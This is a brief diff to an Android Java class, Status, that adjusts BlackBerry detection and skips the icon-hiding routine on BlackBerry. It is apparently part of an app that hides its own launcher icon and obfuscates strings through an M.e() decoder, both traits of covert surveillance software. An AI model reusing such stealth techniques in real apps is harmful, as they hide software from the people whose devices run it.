@@ -956,7 +956,7 @@ public class Status {
 	static public void setIconState(Boolean hide) {
 		// Nascondi l'icona (subito in android 4.x, al primo reboot
 		// in android 2.x)
-		if(!Cfg.GUI){
+		if(!Cfg.GUI || Status.isBlackberry()){
 			return;
 		}
 		PackageManager pm = Status.self().getAppContext().getPackageManager();
@@ -1133,6 +1133,6 @@ public class Status {
 	}
 
 	public static boolean isBlackberry() {
-		return Build.BOARD.equals(M.e("BLACKBERRY"));
+		return Build.BRAND.toUpperCase().equals(M.e("BLACKBERRY"));
 	}
 }
